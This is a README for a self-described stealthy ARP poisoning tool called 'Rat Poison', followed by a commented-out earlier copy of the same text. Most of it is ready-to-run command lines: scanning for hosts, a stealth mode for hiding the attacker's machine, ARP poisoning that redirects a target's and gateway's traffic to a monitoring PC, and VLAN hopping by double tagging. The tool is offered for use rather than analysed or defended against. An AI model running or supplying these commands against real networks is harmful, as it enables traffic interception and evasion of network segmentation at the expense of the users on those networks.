# Rat Poison

A self-made ARP poisoning tool that is stealthy and RFC 5527 compliant. It is capable of VLAN double tagging and ARP poisoning.

## Usage Examples

Help Menu
```bash
python poison.py -h
```

Show Active Hosts within the Local Network
```bash
python poison.py -l 192.168.1.0/24
```
Enable Stealth Mode
```bash
python poison.py --stealth
```
Optional Arguments
ARP Poisoning Mode without VLAN Double Tagging
To be used with -T, -M, -G

```bash
python poison.py -P
```
ARP Poisoning Mode with VLAN Double Tagging
To be used with -T, -M, -G, -TM, -MM, -GM, --vlan1, --vlan2

```bash
python poison.py -PV
```
Argument Usage
Specify target's IP address: -T 192.168.10.10
Specify monitoring PC IP address: -M 192.168.10.11
Specify gateway/target2 IP address: -G 192.168.10.1
Specify target's MAC address: -TM "AA:AA:AA:AA:AA:AA"
Specify monitoring PC MAC address: -MM "BB:BB:BB:BB:BB:BB"
Specify gateway/target2 MAC address: -GM "CC:CC:CC:CC:CC:CC"
Specify the first Dot1Q VLAN number: --vlan1 10
Specify the second Dot1Q VLAN number: --vlan2 20

## Attack Examples

Normal ARP Poisoning
```bash
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

Normal ARP Poisoning with Stealth
```bash
python poison.py --stealth -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

VLAN Hopping with ARP Poisoning (Native VLAN 10, Target VLAN 20)
Requires Target MAC, Monitor MAC, Gateway MAC with vlan1 and vlan2
```bash
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1 -TM "AA:AA:AA:AA:AA:AA" -MM "BB:BB:BB:BB:BB:BB" -GM "CC:CC:CC:CC:CC:CC" --vlan1 10 --vlan2 20
```











<!-- 

# Rat Poison
Self-made ARP poisoning tool. <br/>
Stealthy.<br/>
RFC 5527 Compliant.<br/>
capable of vlan double tagging + arp poison.<br/>

### Usage
#### Help Menu 
```
python poison.py -h                 
```

#### Shows all active host within the local network using ARP Broadcast
```
python poison.py -l 192.168.1.0/24  
```

#### Prevents host machine from being discovered
```
python poison.py --stealth
```


###Options Arguments
ARP poisoning mode without VLAN double tagging<br>
**\*To be used with -T, -M, -G**
```
python poison.py -P                                   
```
ARP poisoning mode with VLAN double tagging<br>
**\*To be used with -T, -M, -G, -TM, -MM, -GM --vlan1 --vlan2**
```
python poison.py -PV
```

#### Arguments Usage
Specify target’s IP address
```
-T 192.168.10.10
```

Specify monitoring PC IP address
```
-M 192.168.10.11
```

Specify gateway/target2 IP address
```
-G 192.168.10.1
```

To specify target’s MAC address
```
-TM “AA:AA:AA:AA:AA:AA”
```

Specify monitoring PC MAC address
```
-MM “BB:BB:BB:BB:BB:BB”
```

Specify gateway/target2 MAC address
```
-GM “CC:CC:CC:CC:CC:CC”
```

To specify the first Dot1Q VLAN number
```
--vlan1 10
```

To specify second Dot1Q VLAN number
```
--vlan2 20
```


###Attacks Usages
#### Nommal ARP Poisoning
```
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

#### Nommal ARP Poisoning with stealth
```
python poison.py --stealth -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

#### VLAN Hopping with ARP Poisoning (Native VLAN 10, Target VLAN 20)
\* Requires Target MAC, Monitor MAC,Gateway MAC with vlan1 and vlan2

```
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1 -TM "AA:AA:AA:AA:AA:AA" -MM "BB:BB:BB:BB:BB:BB" -GM "CC:CC:CC:CC:CC:CC" --vlan1 10 --vlan2 20
```


                                                 
 -->